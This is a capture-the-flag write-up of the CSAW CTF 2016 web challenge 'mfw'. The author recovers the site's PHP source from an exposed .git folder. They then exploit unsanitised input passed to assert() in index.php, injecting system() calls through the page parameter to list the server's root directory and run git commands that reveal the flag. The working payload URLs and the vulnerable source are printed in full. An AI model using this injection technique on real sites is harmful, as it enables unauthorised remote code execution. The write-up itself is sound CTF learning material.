# mfw (Web, 125pts)

## Problem

Hey, I made my first website today. It's pretty cool and web7.9.
http://web.chal.csaw.io:8000/

## Solution

We get simple website, build with PHP, Bootstrap and with Git. Url looks vulnerable for Local File Include and Directory Traversal, but couple of standards payloads returned only "Detected hacking attempt!" or "That file doesn't exist!" messages.  

![Screen caption]
(assets/mfw2.png)


### Digging into .git folder

Abandoned, readable .git folder is a gold mine. Access to one in this challenge wasn't restricted in any way, I could easily navigate through all folders and files using web browser:

![Git]
(assets/mfw3.png)

But I wanted source code to find out the way to exploit LFI or Directory Traversal, so with little help of my own tool, **diggit** (https://github.com/bl4de/security-tools/tree/master/diggit) I downloaded sources:

```
$ ./diggit.py -u http://web.chal.csaw.io:8000/ -t /Users/bl4de/hacking/ctf/2016/CSAW_CTF_2016/mfw -r true -o 7a0a66bbc50a8fdb83909b79c328bff4596f71ed
```

![diggit in action]
(assets/mfw6.png)

I checked the file ```flag.php``` (I found commented link to it earlier, when I was checking HTML source of website), but it does not contain anything interesting, except comment ```//TODO``` - and that was crucial information to find the solution of this challenge, but more on this later:


```php
<?php
// TODO
//$FLAG = '';
?>
```

### Source code static analysis

Next, I've started to poke around ```index.php``` and validation logic, trying to find the way to exploit it with some well crafted payload:

```php
<?php

if (isset($_GET['page'])) {
	$page = $_GET['page'];
} else {
	$page = "home";
}

$file = "templates/" . $page . ".php";

// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");

?>

/*
	HTML code here, nothing special, no logic...
*/

<div class="container" style="margin-top: 50px">
	<?php
		require_once $file;
	?>
	
</div>
		
```

Unfortunately, I wasn't able to find any payload working in both assertions. Even if I could break first assertion and successfully insert Directory Traversal payload (like ```\.\./``` or ```.?/```), I got stuck with second assertion. 

When I stopped for a second to think about the right solution, I've started to think about one particular line:

```php
$file = "templates/" . $page . ".php";
```

```$page``` was used here directly from GET parameter, without any validation. String concatenation allows here to do anything, BEFORE any of following ```assert()``` calls.


I needed something powerful and something what returns its output without any additional functions like ```print()``` or ```echo``` (which is, in fact, not a function).

And ```system()``` was exactly what I was looking for (http://php.net/manual/en/function.system.php):

```
(PHP 4, PHP 5, PHP 7)
system — Execute an external program and display the output

```
So it was even better that LFI I was trying to find. I found much more powerful Remote Code Execution (RCE) and from now on I could do anything I wanted to.

### Exploiting Remote Code Execution with system()

My payloads were pretty simple. To execute ```ls -lA``` command in the root directory I've used this one:

```
http://web.chal.csaw.io:8000/?page='.system("cd ../../../; ls -lA;").'about
```

This causes server to create such line of code:

```php
$file = "templates/" . '.system("cd ../../../; ls -lA;").' . ".php";
```

As a result, I got this:

```
.dockerenv
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
That file doesn't exist!
```

**EDIT** Output from Command Execution actually comes from one or both lines with ```assert()``` calls (it depends on usage of "../" in payload and which assertion failed first), not from the first line with ```$page``` parameter as I thought. Thanks to Dinesh Kota for pointing this!



--
#### HINT

If you are able to display such output, use option 'View source' in your browser. This allows one to display text output with all white characters (tab, new line and so on) handled in the correct way.

Here's an output from previous payload directly in the browser tab (interpreted as regular HTML, which is very hard to read, not what we want to see):

![command as HTML]
(assets/output1.png)


And here's how it looks like when 'View source' option is used instead:

![command as HTML]
(assets/output2.png)

--

At this moment I thought I just needed to find ```flag.txt``` or similar file and just took 125 points home. I was wrong :)

I couldn't find anything what looks like legitimate file with flag. I was trying various ```find``` and ```grep``` combinations with plenty of false positive results - but there were no flag at all.

Then, I realized that comment I found earlier, in file called ```flag.php```: TODO.
Flag. **TODO**.
There was no flag **yet**!


### Playing with Git, again

I get back to Git. As I was able to execute any command, I went straight into website folder and checked status of the repository (this is what I put in address bar in Chromium):

```
view-source:http://web.chal.csaw.io:8000/?page='.system("cd /var/www/html/;git status;").'about
``` 

Bingo!



![git status]
(assets/mfw7.png)

```flag.php``` was modified, but no changes were added to commit and commited, so file I've downloaded earlier didn't contain newest changes.

The last one command put in browser's address bar finished the challenge:


```
view-source:http://web.chal.csaw.io:8000/?page='.system("cd /var/www/html/;git diff;").'about
```

And here we are:

![Flag]
(assets/mfw5.png)


The flag:

```php
<?php $FLAG="flag{3vald_@ss3rt_1s_best_a$$ert}"; ?>
```

![git diff FTW!!!]
(assets/gitdiff.png)

--

I had a lot of fun with this challenge, even if it was relatively simple. It contains a lot of obvious vulnerabilities like (potential) LFI with Directory Traversal and (fully exploitable) RCE, but in the end the solution turned into Git and some Git commands knowledge.

Thanks to CSAW Team for great CTF this year!

Looking forward for CSAW CTF 2017 :)
